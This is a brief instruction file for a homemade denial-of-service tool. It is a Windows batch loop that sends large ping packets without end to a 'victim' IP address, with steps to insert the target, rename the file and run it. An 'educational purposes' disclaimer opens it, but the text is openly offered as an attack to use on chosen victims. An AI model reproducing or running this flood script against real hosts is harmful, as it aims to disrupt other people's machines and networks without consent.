*Warning I am not responsible for any damage done or accountable for the usage of this software!
This is only for educational purposes.

How to use: 

1.) open the dos.txt file it will read:
:loop
ping <IP Address> -l 65500 -w 1 -n 1
goto :loop

2.) rename <IP Address> with the ip address of the victim then save and exit the file

3.) rename the dos.txt file to dos.bat

4.) run the file

*to change victims simply rename the file to dos.txt and change the previous ip address to the next one and rename the file to: dos.bat